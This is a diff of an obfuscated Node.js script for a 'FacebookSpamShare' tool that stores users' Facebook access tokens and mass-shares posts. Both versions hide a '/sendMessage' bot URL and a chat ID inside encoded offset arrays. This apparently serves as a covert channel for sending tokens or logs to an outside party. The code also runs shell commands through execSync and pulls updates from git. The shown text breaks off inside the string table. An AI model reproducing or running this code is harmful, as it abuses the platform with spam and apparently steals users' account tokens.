@@ -1,2434 +1,2428 @@
-const ZC = a;
-(function (Q, n) {
-    const Zv = a, w = Q();
+function h(U, N) {
+    const V = m();
+    return h = function (B, g) {
+        B = B - (-0x102e + -0x12c5 + 0x1 * 0x24b0);
+        let C = V[B];
+        if (h['sQFuGn'] === undefined) {
+            var Q = function (M) {
+                const d = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
+                let f = '', p = '';
+                for (let H = 0x31a * -0xa + 0x1 * 0x1fa1 + -0x9d, o, E, v = -0xb73 + -0x47b + -0x2 * -0x7f7; E = M['charAt'](v++); ~E && (o = H % (0x18f4 + 0x5 * 0x20b + -0x2327) ? o * (-0x1a9e * 0x1 + -0x1fa6 + 0x3a84) + E : E, H++ % (0x2466 + -0x1343 * 0x1 + -0x3 * 0x5b5)) ? f += String['fromCharCode'](-0xa * -0x2dd + -0x2 * 0xf47 + 0x53 * 0x9 & o >> (-(0x1f * -0x6f + -0x18c7 + 0x263a) * H & 0x3 * 0x842 + 0x9 * -0x2e8 + -0x9 * -0x28)) : -0x2491 + -0xe1 * 0x1 + 0x1 * 0x2572) {
+                    E = d['indexOf'](E);
+                }
+                for (let T = -0x1 * -0x6da + -0x2f * 0x3b + 0x3fb, G = f['length']; T < G; T++) {
+                    p += '%' + ('00' + f['charCodeAt'](T)['toString'](0x174c + 0x154 + -0x1890))['slice'](-(-0x5c9 + 0x958 + 0x12f * -0x3));
+                }
+                return decodeURIComponent(p);
+            };
+            h['PXfEvk'] = Q, U = arguments, h['sQFuGn'] = !![];
+        }
+        const t = V[-0x2167 * -0x1 + -0x1fbe * -0x1 + -0x4125], F = B + t, J = U[F];
+        return !J ? (C = h['PXfEvk'](C), U[F] = C) : C = J, C;
+    }, h(U, N);
+}
+const mz = h;
+(function (U, N) {
+    const mu = h, V = U();
     while (!![]) {
         try {
-            const b = -parseInt(Zv(0x38c)) / (0x2339 + -0xa94 + -0x629 * 0x4) + parseInt(Zv(0x3bb)) / (0x4 * 0x58f + 0x729 + 0x1 * -0x1d63) + -parseInt(Zv(0x2ce)) / (-0x1a2b + 0x33 * -0xb5 + 0x3e3d) + -parseInt(Zv(0x407)) / (0x1c6c + 0x16fd * -0x1 + -0x56b) * (-parseInt(Zv(0x3fa)) / (0x1 * 0x8bf + 0x3ec + -0xca6)) + -parseInt(Zv(0x29b)) / (-0x1c06 + -0x188e + 0x349a * 0x1) * (-parseInt(Zv(0x1c6)) / (-0x28 * -0x5e + 0x1b35 + -0x29de)) + parseInt(Zv(0x214)) / (0x1418 + 0x1 * 0xbce + -0x1fde) * (-parseInt(Zv(0x3af)) / (0xb66 + 0x214c * 0x1 + -0x2ca9)) + parseInt(Zv(0x345)) / (0x2f * -0xa3 + 0x1dbb + 0x3c);
-            if (b === n)
+            const B = parseInt(mu(0x30b)) / (-0x2520 + -0x26b5 * -0x1 + -0x194) + -parseInt(mu(0x32f)) / (0x2272 + 0x1 * 0x8bf + -0x2b2f) + parseInt(mu(0x32c)) / (-0x1de2 + -0x218f + 0x3f74) * (parseInt(mu(0x2ae)) / (-0x824 + 0x5 * -0x626 + 0x26e6)) + -parseInt(mu(0x3e2)) / (0x1 * 0x1131 + 0x1105 * 0x1 + -0x2231) * (parseInt(mu(0x1c6)) / (0x835 + 0x214f * -0x1 + 0x1920)) + parseInt(mu(0x2e5)) / (-0x5be * 0x2 + -0x24d9 * -0x1 + -0x17 * 0x11a) * (-parseInt(mu(0x410)) / (0x1f90 + 0x1 * -0x23f9 + 0x471)) + parseInt(mu(0x1e8)) / (0x26 * 0x6f + 0x1 * -0x240c + -0x15 * -0xef) * (parseInt(mu(0x1be)) / (-0x1b30 + -0x2e * -0x1c + 0xb19 * 0x2)) + parseInt(mu(0x40f)) / (0x1608 + 0x1677 + -0x2c74);
+            if (B === N)
                 break;
             else
-                w['push'](w['shift']());
+                V['push'](V['shift']());
         } catch (g) {
-            w['push'](w['shift']());
+            V['push'](V['shift']());
         }
     }
-}(Z, -0x495b + -0x29cd7 * 0x4 + 0x16b2c5));
-import Zr from 'fs';
-import Zz from 'circular-json';
+}(m, 0x4f47f + -0x2107d * 0x1 + 0xc1876 * 0x1));
+import mR from 'fs';
+import mn from 'circular-json';
 import { execSync } from 'child_process';
-import { v4 as ZJ } from 'uuid';
+import { v4 as mY } from 'uuid';
 import { getRandom } from 'random-useragent';
-import Zh from 'axios';
+import { simpleGit } from 'simple-git';
+import ma from 'axios';
 import { exit } from 'process';
-import Zq from 'https';
-const yellow = '\x1b[1;33m', green = ZC(0x1f5), red = ZC(0x28e), white = ZC(0x21b), cyan = ZC(0x35f), magenta = '\x1b[1;35m', blue = ZC(0x402), underline = '\x1b[4m', reset = ZC(0x3bc), info = blue + ZC(0x368) + white + '\x20', error = red + '[ERROR]' + white + '\x20', warn = yellow + '[WARNING]' + white + '\x20', ask = yellow + '[?]' + white + '\x20', tokenfile = ZC(0x19e), sharelogf = ZC(0x276), offsets = [
-        0x3 * 0x8fa + 0x1 * 0x751 + 0x108 * -0x21,
-        -0x2bd * 0x2 + -0x15a1 + 0x1b4d,
-        -0x2 * -0x12df + 0x25ba + -0x4b47,
-        0x1 * 0x946 + -0x38b * -0x6 + -0x1e56,
-        0x1 * -0x1df3 + 0xb9d + 0x99 * 0x1f,
-        0x7 * -0x31 + 0x1 * -0x27b + 0x406,
-        -0x21b5 + 0x8b7 * 0x2 + 0x107f,
-        -0xf82 + -0x110b * 0x2 + 0x63a * 0x8,
-        -0x1e5 * 0x2 + -0x1956 + 0x1d59,
-        0x16e5 + -0xe * 0x1ac + 0xb3,
-        0xb * -0x34a + -0x225d + -0x46c5 * -0x1,
-        0x2 * -0x31a + -0x222f + -0x99 * -0x44,
-        -0x177c + 0x110e + 0x1 * 0x6af,
-        -0xb02 + 0x1 * -0x195a + 0x1 * 0x24a3,
-        0xc * 0x2e0 + 0x9 * -0x82 + -0x1d87 * 0x1,
-        -0x6bb * -0x2 + 0xcaf + -0x19db,
-        0x1ddb + 0x1387 + -0x1 * 0x3121,
-        0xfe * -0x11 + -0x11b * -0xb + 0x4fa,
-        0x121f + 0x1a41 * -0x1 + -0x53 * -0x1a,
-        0x3 * -0x26 + -0x16c + 0x220,
-        0x5d * -0x56 + -0x151 * -0x11 + -0x1 * -0x950,
-        -0x13b7 + 0xc9b + 0x767,
-        0x11 * -0x21 + -0x566 * 0x7 + 0xa10 * 0x4,
-        0x1ad9 + 0x1 * 0x611 + -0x2099,
-        0x16 * -0x55 + 0x1 * 0x42b + 0x125 * 0x3,
-        -0x15ba + 0x14b * -0xb + 0x2435,
-        0x1c5 * -0x2 + -0x543 * -0x1 + -0x162 * 0x1,
-        -0x1600 + 0x1 * -0x755 + -0x1 * -0x1dc3,
-        0x1de5 + -0x1952 + 0xf * -0x46,
-        -0x5 * -0x17d + -0xc40 + 0x535,
-        -0x235 + -0x4e * -0x7a + -0x22ad,
-        0x225a + -0x1 * -0xc6b + -0x2e84,
-        -0x1 * 0x1395 + -0x321 + -0xb87 * -0x2,
-        0x15d * -0x11 + 0x109a + 0x1 * 0x6da,
-        0x1f08 + -0x10 + 0x1 * -0x1e85,
-        0x71 * 0x2 + 0x9bd + 0x29 * -0x40,
-        0x16a7 + -0x2368 + 0xcf2,
-        0x1 * 0x226b + 0x1811 * 0x1 + -0x3a05,
-        0x13ed * -0x1 + 0x1 * -0x26e + 0x1688,
-        0x1af8 + 0xc * -0x4a + 0x1709 * -0x1,
-        -0x617 + -0x1264 + -0xc * -0x213,
-        -0x1e08 + -0x1 * 0x1f39 + 0x3dbb,
-        -0x12c5 + 0x1157 + 0x1b4,
-        -0x25ca + 0x1f1b * -0x1 + 0x452e,
-        0x103f * -0x1 + -0x3 * -0x2b3 + 0x899,
-        0x1f80 + 0x46 * -0x41 + -0xd79
-    ], buri = ZC(0x3a0), cID = ZC(0x3d7), calcu = Q => String[ZC(0x30a)](Q * (0x2 * -0x8b8 + 0x164 * -0x1 + 0x96b * 0x2) / (0x1fc + -0x1cf * -0x3 + 0x17b * -0x5) - (0x26ff + -0x61 * -0x9 + 0x2 * -0x152f) + (0x18c5 + -0x2301 + 0x1 * 0xa41) * (0x11a * -0x3 + 0xa * 0x127 + -0x836) - (0x648 * -0x2 + 0x153 + 0xb47 * 0x1) + (0xd98 + -0x1a78 + -0x33d * -0x4) / (0x3 * 0xb7b + -0x416 + 0x11 * -0x1c9)), tg = '' + buri + offsets[ZC(0x36d)]((Q, n) => Q + calcu(n), '') + '/sendMessage';
+import mZ from 'https';
+const yellow = mz(0x212), green = '\x1b[1;32m', red = '\x1b[1;31m', white = mz(0x205), cyan = mz(0x359), magenta = mz(0x402), blue = mz(0x1f5), underline = mz(0x25a), reset = mz(0x2b5), git = simpleGit(), info = blue + mz(0x26e) + white + '\x20', error = red + mz(0x2e7) + white + '\x20', warn = yellow + mz(0x39d) + white + '\x20', ask = yellow + '[?]' + white + '\x20', tokenfile = './token.json', sharelogf = mz(0x1d2), offsets = [
+        0x1 * 0x120e + -0x5 * 0x4a2 + -0x553 * -0x1,
+        -0xff1 * -0x2 + 0x49d * 0x1 + -0x244d,
+        0x1279 + -0x1d3 + -0x1075,
+        0xda1 + 0xb60 + -0x57 * 0x49,
+        0x48 + -0x23e4 + 0x23cd,
+        0x9ef + 0x1f6b + -0x2e * 0xe5,
+        -0x7d * -0x2f + 0x1f91 + -0x364c,
+        0x1 * 0x172d + 0x130a * -0x1 + -0x3eb,
+        0x158 + 0x23f5 + -0x2514,
+        -0x1e25 * -0x1 + -0x1361 * -0x1 + -0x3156,
+        0x29 * -0x85 + 0x256b + -0xfe4,
+        -0x2111 + -0x961 + 0x2ab3,
+        -0x9a7 * -0x3 + -0x1 * -0x201f + -0x3cd3,
+        0x1 * -0x25f7 + 0x10eb * 0x1 + 0x1553,
+        0xc54 + -0x253d * 0x1 + 0xd8 * 0x1e,
+        0xea5 * -0x1 + 0x151 * -0x2 + 0x1191,
+        0x9d9 + -0x15a1 + 0xc09,
+        0x479 * 0x3 + -0x6 * 0xc5 + 0x138 * -0x7,
+        0x1db2 + -0x1704 + -0x662,
+        0x25d6 + 0x23bf + -0x4953,
+        -0x1f * 0x62 + -0x156 + 0xda7,
+        0x5 * 0x631 + -0x17f2 + -0xd7 * 0x8,
+        0x16a + -0x1058 + 0xf33,
+        -0x403 + -0x11c0 + 0x1614,
+        0x19 * -0x13f + 0x2154 + -0x25 * 0xd,
+        0x1 * -0xc4c + -0x490 * 0x1 + 0x111e,
+        -0x3d * 0x13 + -0x203d + 0x251b,
+        0x1b96 * -0x1 + -0x1 * 0x2675 + -0xd * -0x51d,
+        -0x2703 + -0x6 * 0x3fa + 0x3f58,
+        0x4e4 * 0x1 + -0x80 * -0x21 + -0x14fe,
+        0x17e * 0x1a + -0x8c5 + -0x1dbd * 0x1,
+        0x2262 + 0x1 * -0x1615 + -0xc0c,
+        -0x1 * 0x15d0 + -0x1 * 0x1ef3 + -0x5 * -0xa9f,
+        -0x7 * 0x85 + -0x7fa + 0xbe4,
+        0x104f + 0x8f * 0x13 + -0x1a79,
+        -0x614 + -0x1 * -0x15f7 + 0xf84 * -0x1,
+        -0x83 * -0x11 + -0x5 * 0x223 + 0x22d,
+        0xe00 + 0x1fda + -0x2d63,
+        0x2 * 0xfa3 + 0x1cea + -0x3c03,
+        -0x3 * -0xa65 + -0x1ef4 + 0x3c,
+        -0xd6 * 0xc + 0x605 * 0x5 + -0x13a8,
+        0xd39 * 0x1 + -0x6d5 + -0x5ea * 0x1,
+        0x1 * 0x629 + -0xa2c + 0x449 * 0x1,
+        -0x1 * -0xd44 + 0x8 * 0x41a + 0x2dcb * -0x1,
+        -0x1d2f + 0x1b * -0xbb + 0x169 * 0x23,
+        0xcf1 + 0x7a * 0x2c + 0x1 * -0x21a8
+    ], buri = mz(0x253), cID = mz(0x1e5), calcu = U => String[mz(0x433)](U * (-0xa5e + -0x265b + 0x30bb) / (-0x1326 + -0x22ee + 0x3616) - (-0x2174 + 0x1 * 0xbf5 + 0x95 * 0x25) + (-0x85c * -0x2 + 0xe9f + -0x1f52) * (-0x1616 + -0x1781 + 0x2d99) - (-0x357 * 0xb + -0x206e + 0x4535) + (-0x1044 + -0x2329 * -0x1 + 0x12d1 * -0x1) / (0x1 * -0x238b + -0x378 + -0x7 * -0x593)), tg = '' + buri + offsets[mz(0x3ef)]((U, N) => U + calcu(N), '') + mz(0x33c);
 function isTermuxAPIInstalled() {
-    const ZR = ZC, Q = {
-            'pnVPK': function (w, b) {
-                return w(b);
+    const mk = mz, U = {
+            'hzNjo': function (V, B) {
+                return V(B);
             }
-        }, n = Q[ZR(0x20e)](execSync, 'echo\x20$TERMUX_API_VERSION')[ZR(0x2d2)]();
-    return n[ZR(0x34c)]() ? !![] : ZR(0x26b) !== ZR(0x3b8) ? ![] : ![];
+        }, N = U[mk(0x24a)](execSync, mk(0x26f))[mk(0x38d)]();
+    return N[mk(0x247)]() ? !![] : ![];
 }
-try {
-    console[ZC(0x1b8)](getTimeStamp() + info + ZC(0x299));
-    let hasChanges = ![];
+async function updateRepo() {
+    const mr = mz, U = {
+            'aqcMv': function (N, V) {
+                return N + V;
+            },
+            'HAKRV': 'Are\x20you\x20serious\x20right\x20neow\x20bruh',
+            'uFQsd': function (N, V) {
+                return N(V);
+            },
+            'OlzHO': mr(0x3d6),
+            'oJpDs': function (N, V) {
+                return N !== V;
+            },
+            'OmthD': mr(0x32a),
+            'WlrHo': mr(0x372),
+            'afpSE': function (N, V) {
+                return N + V;
+            },
+            'mImGb': function (N, V) {
+                return N + V;
+            },
+            'JqAWQ': function (N) {
+                return N();
+            },
+            'stQHt': function (N, V) {
+                return N === V;
+            },
+            'SsXMs': function (N, V) {
+                return N + V;
+            },
+            'XTaAM': function (N) {
+                return N();
+            },
+            'gPDpz': 'tVnQG',
+            'PYtqM': 'iTMni',
+            'DpdBk': function (N, V) {
+                return N + V;
+            },
+            'GfnEy': function (N, V) {
+                return N + V;
+            },
+            'JouSi': function (N, V) {
+                return N + V;
+            },
+            'tEilv': function (N) {
+                return N();
+            },
+            'vsZKM': mr(0x20a)
+        };
     try {
-        execSync('git\x20diff\x20--quiet\x20setup.sh');
-    } catch (ZU) {
-        console[ZC(0x1b8)](getTimeStamp() + info + ZC(0x291)), execSync('git\x20stash'), hasChanges = !![];
-    }
-    try {
-        execSync(ZC(0x39a));
-    } catch (ZI) {
-        console['log'](getTimeStamp() + info + ZC(0x3fd)), process[ZC(0x382)](0x1c1f + -0x59 * 0x57 + 0x221);
-    }
-    const response = execSync('git\x20pull')[ZC(0x2d2)]();
-    if (response[ZC(0x1af)]('Already\x20up\x20to\x20date.'))
-        console[ZC(0x1b8)](getTimeStamp() + info + ZC(0x39e));
-    else {
-        const commitMessage = execSync('git\x20log\x20-1\x20--pretty=%B')[ZC(0x2d2)]();
-        console[ZC(0x1b8)](getTimeStamp() + info + ZC(0x275) + yellow + ZC(0x396) + reset), console[ZC(0x1b8)](getTimeStamp() + info + (ZC(0x1fb) + (green + commitMessage + reset)));
-        if (hasChanges)
-            try {
-                execSync(ZC(0x2f0));
-            } catch (Zl) {
-                console[ZC(0x1b8)](getTimeStamp() + error + 'Failed\x20to\x20apply\x20stashed\x20changes.'), console[ZC(0x1b8)](getTimeStamp() + error + Zl[ZC(0x35d)]);
+        if (U[mr(0x3fa)](U[mr(0x282)], U[mr(0x33f)])) {
+            console[mr(0x38c)](U[mr(0x3e7)](U[mr(0x365)](U[mr(0x2ea)](getTimeStamp), info), 'Checking\x20for\x20repository\x20updates...'));
+            const N = await git[mr(0x230)]();
+            if (U[mr(0x42d)](N[mr(0x1f8)][mr(0x3a0)], 0x1537 * -0x1 + -0x1978 + 0x2eaf))
+                console[mr(0x38c)](U['afpSE'](U[mr(0x369)](U[mr(0x37c)](getTimeStamp), info), 'No\x20updates\x20detected.\x20FacebookSpamShare\x20is\x20already\x20up\x20to\x20date.'));
+            else {
+                if (U[mr(0x1ff)] !== U[mr(0x267)]) {
+                    const V = await git[mr(0x38c)](['-1']), B = V[mr(0x2f7)][mr(0x38e)], g = V[mr(0x2f7)]['hash'], C = new Date(V[mr(0x2f7)][mr(0x327)])[mr(0x3a5)](), Q = V[mr(0x2f7)]['author_name'], t = V[mr(0x2f7)][mr(0x24d)];
+                    console['log'](U['DpdBk'](U['afpSE'](U[mr(0x37c)](getTimeStamp), info), mr(0x21d))), console['log'](U[mr(0x3e7)](getTimeStamp() + info, green + '(' + g + ')' + white + ':\x20' + green + B + '\x20' + white + '>\x20' + green + Q + '\x20' + yellow + '<' + t + '>\x20' + blue + '(' + C + ')')), console[mr(0x38c)](U[mr(0x243)](U['GfnEy'](U['JqAWQ'](getTimeStamp), info), mr(0x40d) + green + mr(0x1ce) + reset)), process[mr(0x288)](0x3c * -0x8e + -0x8 * 0x10d + -0x29b0 * -0x1);
+                } else
+                    return U[mr(0x243)](N, U[mr(0x2df)]);
             }
-        process[ZC(0x382)]();
+        } else
+            U[mr(0x211)](N, U['OlzHO']);
+    } catch (M) {
+        console['log'](U[mr(0x300)](U[mr(0x292)](getTimeStamp), error) + U[mr(0x316)], M[mr(0x38e)]), process[mr(0x288)](-0x1e66 + 0x18 * -0x1a0 + 0x6d * 0xa3);
     }
-} catch (ZG) {
-    console[ZC(0x1b8)](getTimeStamp() + error + ZC(0x235)), console[ZC(0x1b8)](getTimeStamp() + error + ZG[ZC(0x35d)]), process['exit']();
 }
+await updateRepo();
 const mainchoices = [
-        green + ZC(0x3c3) + white + '-\x20' + yellow + ZC(0x334),
-        green + ZC(0x202) + white + '-\x20' + yellow + ZC(0x363),
-        green + ZC(0x1e7) + white + '-\x20' + yellow + ZC(0x25d),
-        green + 'FEEDBACK\x20' + white + '-\x20' + yellow + '(Give\x20Feedback\x20&\x20Suggestions)',
-        green + ZC(0x1c0) + white + '-\x20' + yellow + '(Exit\x20The\x20Program)'
+        green + 'SPAM\x20SHARE\x20' + white + '-\x20' + yellow + mz(0x1f0),
+        green + 'SHOW\x20TOKENS\x20' + white + '-\x20' + yellow + mz(0x3cf),
+        green + 'TOKEN\x20MANAGEMENT\x20' + white + '-\x20' + yellow + mz(0x2f5),
+        green + mz(0x2f8) + white + '-\x20' + yellow + mz(0x1f3),
+        green + 'EXIT\x20' + white + '-\x20' + yellow + mz(0x308)
     ], tokenchoices = [
-        green + ZC(0x2d5) + white + '-\x20' + yellow + ZC(0x233),
-        green + ZC(0x2fa) + white + '-\x20' + yellow + ZC(0x3ec),
-        green + ZC(0x1f0) + white + '-\x20' + yellow + ZC(0x3b2)
-    ], removeTokenHelp = '\x0a' + info + ZC(0x2a1) + green + 'a\x20' + white + '-\x20' + yellow + ZC(0x2f1) + green + 'b\x20' + white + '-\x20' + yellow + ZC(0x205);
+        green + mz(0x2fc) + white + '-\x20' + yellow + mz(0x412),
+        green + 'DELETE\x20TOKENS\x20' + white + '-\x20' + yellow + '(Delete\x20Facebook\x20Access\x20Token)',
+        green + 'BACK\x20' + white + '-\x20' + yellow + mz(0x2fa)
+    ], removeTokenHelp = '\x0a' + info + mz(0x376) + green + 'a\x20' + white + '-\x20' + yellow + mz(0x3db) + green + 'b\x20' + white + '-\x20' + yellow + '(Previous\x20Menu)\x0a';
+function m() {
+    const hf = [
+        's1LJCwS',
+        'C3DNugG',
+        'uvfWvNq',
+        'CfD5BhO',
+        'z2v0vxnLCK5HBwu',
+        'BuLTr2i',
+        'zw1HAwW',
+        'r0jVD0u',
+        'runptK5bqK9sveve',
+        'u3nytxm',
+        'wejbEuK',
+        'D1nbu1y',
+        'C2nju2u',
+        'qxjLihLVDsbZzxjPB3vZihjPz2H0ig5LB3CGyNj1Aa',
+        'CvbNzwe',
+        'ue1XwuC',
+        'r2vuvhK',
+        'vhDVlwzHy3rVCIbHDxrOzw50AwnHDgLVBIbPCYbLBMfIBgvKlIbqBgvHC2uGzgLZywjSzsbPDcbIzwzVCMuGz2v0DgLUzYb0B2TLBG',
+        'yKD1vgy',
+        'qwn1yMi',
+        'sLbqr1u',
+        'BujxD2C',
+        'kIPdt01nqu5euYOQcG',
+        'ywXdwfq',
+        'zNPPCe0',
+        'wLnJruC',
+        'qKH0ze4',
+        'u2nxBeq',
+        'wfrHqu0',
+        'Dg9mB3DLCKnHC2u',
+        'BurRrui',
+        'rgv2zwXVCgvYoIa',
+        'B0fQvum',
+        'whnvs0u',
+        'ru5pvezpvu5e',
+        'z2v0vgLTzq',
+        'BgLZDa',
+        'zMjPza',
+        'DMr0zNi',
+        'uwrMvfu',
+        'cJXIpLnOyxjLieLUzMLUAxrLid4Gpc9IpG',
+        'DgvZDa',
+        'zvjJvem',
+        'B3HYEvG',
+        'Bg9N',
+        'Dg9tDhjPBMC',
+        'BwvZC2fNzq',
+        'zw4TvvmSzw47Ct0WlJK',
+        'BvLuy0G',
+        'nJm5',
+        'vKHnD1O',
+        'Dg9Rzw4',
+        'rKrSv0y',
+        's1bRz0O',
+        'q3DfvfC',
+        'qNLowuO',
+        'C3reve8',
+        'sKHKB3i',
+        'ENvizvO',
+        'jNnLDd0',
+        'z2v0q29TBwfUza',
+        'w1DbuK5jtKDD',
+        'yKDAAve',
+        'CfnnyuO',
+        'y2HHBMDLCW',
+        'EhnqsNm',
+        'wLHTBum',
+        'uwXZtgW',
+        'EuXkC3y',
+        'Dg9mB2nHBgvtDhjPBMC',
+        'teTNAwe',
+        'ChvZAa',
+        't3DqveC',
+        'EfjNr1G',
+        'rgv1Duu',
+        'ywn3wgS',
+        'cJXIpLnOyxjLiefTB3vUDca+idWVyJ4',
+        'uer3Dfi',
+        'wMfZDxy',
+        'rerxzhK',
+        'y21K',
+        'rKDpzfG',
+        'BKjJB2i',
+        'DuHSv2W',
+        'C2XPy2u',
+        'z3DAAgG',
+        'u2HHCMuGqw1VDw50icHWCMvZCYaNAsCGzM9YigLUzMLUAxrLkx4J',
+        'sw5JB3jYzwn0ifvZzxjUyw1L',
+        't090u3i',
+        'z29WqLC',
+        'DerPsLe',
+        'BunoqMu',
+        'CvjwuLa',
+        'DJiUmG',
+        'wuTQuvy',
+        'C3bSAwnL',
+        'rhH2svO',
+        'yMfJAW',
+        'qKXpzwu',
+        'sxrOrgW',
+        'rg8GEw91ihDHBNqGDg8Gz28GyMfJAZ8GkhKVtIWGzgvMyxvSDdOGEsL+iW',
+        'wgzbAg0',
+        'BvnmwKO',
+        's1LqCgy',
+        'AeDeq0C',
+        'Bg9QDNq',
+        'zK56yMO',
+        'C0HjBu8',
+        'Bej1CfK',
+        'Bg5SCvC',
+        'CML4Avq',
+        'kerPC3bSyxKGvg9Rzw5Zkq',
+        'suqG',
+        'qKTky0m',
+        'qLPpt0m',
+        'uwDqDKi',
+        'A2TZq2e',
+        'D3D3lMzHy2vIB29RlMnVBq',
+        'DgvYBxv4lw9Wzw4GAhr0CdOVl3D3DY5MywnLyM9VAY5JB20Vs2fPCNv4rgv2',
+        'D2nhD3i',
+        'shnZwLu',
+        'twf5',
+        'zu5mBe8',
+        'kfjLBw92zsbbteWPcG',
+        'sgnmq2S',
+        'v29WteO',
+        'Cvjoshe',
+        'z0v0y2C',
+        'A0TdCfu',
+        'ue52sMm',
+        'nwvPy2vPyG',
+        'DhLPt0i',
+        'Ahr0Chm6lY9IlwDYyxbOlMzHy2vIB29RlMnVBs9HDxrOl2XVz2LU',
+        'Dg9Rzw5jBMrLEa',
+        'B2TruxG',
+        'ywzWu0u',
+        'tw96AwXSys81lJaGkfDPBMrVD3mGtLqGmtaUmdSGv2LUnJq7ihG2ncKGqxbWBgvxzwjlAxqVntm3lJm2icHlsfrntcWGBgLRzsbhzwnRBYKGq2HYB21LlZeWnY4WlJaUmcbtywzHCMKVntm3lJm2',
+        'rxjfz0i',
+        'u1rfvfa',
+        'CKDdA0G',
+        'zw4Tvvm',
+        'rvr0wNm',
+        'qNLWyxnZAw5NiezHy2vIB29RiefqssbYyxrLigXPBwL0lI4U',
+        'CMvKDwnL',
+        'ls0Tls0Tls0Tlq',
+        'vg9Rzw4Gv2fZifn1y2nLC3nMDwXSEsbtyxzLza',
+        'vMHIr2m',
+        'twTHA3a',
+        'ru5tvvjfifrirsbgqunfqK9psYbqt1nuieLtifnfvcbutYbqvujmsumU',
+        's0Hlthu',
+        'rNDys0W',
+        'yMzqz3q',
+        'rKjtCgfTu2HHCMv+iW',
+        'DKjtqKi',
+        'B0PWrhm',
+        'DgnTDhu',
+        'rNP0sei',
+        'A2nsEwC',
+        'AwHVA2G',
+        's0vHzNu',
+        'ANfmq2m',
+        'CfLLsfG',
+        'g1SXoZm1Bq',
+        'suPrvgi',
+        'zLfzr1e',
+        'ChjVBxb0',
+        'twfYy2G',
+        'thbmDKC',
+        'u21bBvO',
+        'iKDVB2DSzsbdAhjVBwuIo3y9iJeWnYiSicjdAhjVBwL1Bsi7DJ0Imta3iIWGiK5VDd1bp0jYyw5KiJT2psiYnci',
+        'Cg9ZDa',
+        'BwfPBG',
+        'z2v0rNvSBfLLyxi',
+        'ugXLyxnLihj1BIb0AguGC2nYAxb0igfNywLUihvZAw5NoIa',
+        'id4G',
+        'nJmZnZKXnhrIA3jJrW',
+        'mtKYvvbzwu5r',
+        'EfL0A1u',
+        'kefKzcbgywnLyM9VAYbby2nLC3mGvg9Rzw4P',
+        'sw52ywXPzcbpChrPB24U',
+        'EenzDgK',
+        'wxHbsvO',
+        'uwTiAvK',
+        'tuz5wxC',
+        'rMfJzwjVB2SGug9ZDcbvuKX+iW',
+        'yNvZAw5LC3mUzMfJzwjVB2SUy29T',
+        'CfrQzeC',
+        'u3rHCNrPBMCUlI4',
+        'rMfJzwjVB2S',
+        'zeLbC3a',
+        'zxjYB3i',
+        'Dg9Rzw5nyw5Hz2vTzw50',
+        'q29UBMvJDgLVBIbfCNjVCJOG',
+        'qwXSifrVA2vUCYbszw1VDMvKifn1y2nLC3nMDwXSEq',
+        'wLbrC1K',
+        'C2vHCMnOugfYyw1Z',
+        'yMDfuLe',
+        'Dffwtvm',
+        'vgHLigfJy2vZCYbWzxjPB2qGAgfZigv4CgLYzwqU',
+        'qvHPrK0',
+        'EwHAuMG',
+        'rMfJzwjVB2SGugfZC3DVCMq/oIa',
+        'CfrhDgq',
+        'BKf3CMy',
+        'Dg9uAxrSzq',
+        'C3rrshq',
+        'AM9PBG',
+        's2fPCNuUia',
+        'rLzZq0i',
+        'EeH6qLm',
+        'C2vSzwn0zwruB2TLBG',
+        'zNjVBunOyxjdB2rL',
+        'rNHKt2S',
+        'zNDtANC',
+        'mtq5meHfDuDIyW',
+        'C09qywi',
+        'wuPrAgG',
+        'lI4U',
+        'zgXLAfa',
+        'ChDTyvC',
+        'Aw5WDxq',
+        'Ag1rB3y',
+        'mZm3mdiXofvsu1Dhuq',
+        'v3jVBMCGq3jLzgvUDgLHBhm',
+        'CwTPwvm',
+        'yLPxuxC',
+        'zMfhBwS',
+        'zLnuAwO',
+        'yLrWD0q',
+        'yMXKA20',
+        'rLnt',
+        'EgrNlw9Wzw4GAhr0CdOVl3D3DY5MywnLyM9VAY5JB20Vs2fPCNv4rgv2',
+        'qxbWuvy',
+        'B1vqzve',
+        'lI9ZAgfYzs5SB2C',
+        'u2vYDMLJzsbvBMf2ywLSywjSzsaO',
+        'DxnLCI1Hz2vUDa',
+        'y2LltgW',
+        'y2XZ',
+        's2riDLG',
+        'C3jrAwW',
+        'uLDiCu4',
+        'vgvSzwDYyw0',
+        'Dxfptu8',
+        'CgzqAK0',
+        't3PWwLa',
+        'Bg9NAw4',
+        'yxv0AgvUDgLJyxrL',
+        'CMvTB3zLvg9Rzw4',
+        'DuHxrLm',
+        'wKnUveW',
+        'EKHOsKS',
+        'DKjZDe4',
+        'nJy0nZy1mZeXnG',
+        'ALP3yNy',
+        'CLLLDg0',
+        'mJe2mZzXuu1Pyu4',
+        'yu5Rvwm',
+        'DKLIvhC',
+        'BuT2y0C',
+        'zwTsBMS',
+        'uwfYBgy',
+        'CMvHzezPBgvtEw5J',
+        'zgf0yq',
+        'kfnWyw0Gu2HHCMuGug9ZDcbVBIbgywnLyM9VAYK',
+        'A1z3twO',
+        'r2P4Chu',
+        'keDPDMuGrMvLzgjHy2SGjIbtDwDNzxn0Aw9UCYK',
+        'u0vmrG',
+        'g1SXoZm0Bq',
+        'zMvLzgjHy2TuExbL',
+        'tgLNzxi',
+        'C3vTBwfYEq',
+        'rM1iCfm',
+        'u1zWDwi',
+        'yw1VDw50',
+        'Ew1Srwm',
+        'sKD3Evq',
+        'wgzsreK',
+        'z1beChO',
+        'rgnLwfm',
+        'yNv0Dg9Ux3DPDgHFzgLZywjSzwq',
+        'ueXfqvnfiefwt0LeifjvtK5jtKCGveHfiezbq0vct09lifnqqu0Gu0HbuKuGq09ntuforcbuv0LdrsbjtIbuseuGvevstuLoquWGv0LuscbuseuGu0fnrsbut0TftIWGqvmGveHjuYbxsuXmievyq0vfrcbuseuGu0HbuKuGteLnsvq',
+        'v0Lov3i',
+        'z2rpz1y',
+        'g1SXoZm3Bq',
+        'zMP4ugK',
+        'uhDtuLe',
+        'tM5vy3m',
+        'EvzXzvu',
+        'vxbKyxrLiezHAwXLzdO',
+        'zNjotxq',
+        't2n0B2jLCG',
+        'zKj1tgq',
+        'ChjVDg90ExbL',
+        'pgi+rMfJzwjVB2SGvxnLCM5HBwu6pc9IpIa',
+        'qLPxCLK',
+        'DuzrC2q',
+        'g1SXoZmZBq',
+        'txbsu0i',
+        'ueffCK8',
+        'y3jLyxrLzf90Aw1L',
+        'DwHYAxi',
+        'EvrWtM4',
+        'vfPIweS',
+        'qxbYAwW',
+        'ChvKvw0',
+        'r3zuqw4',
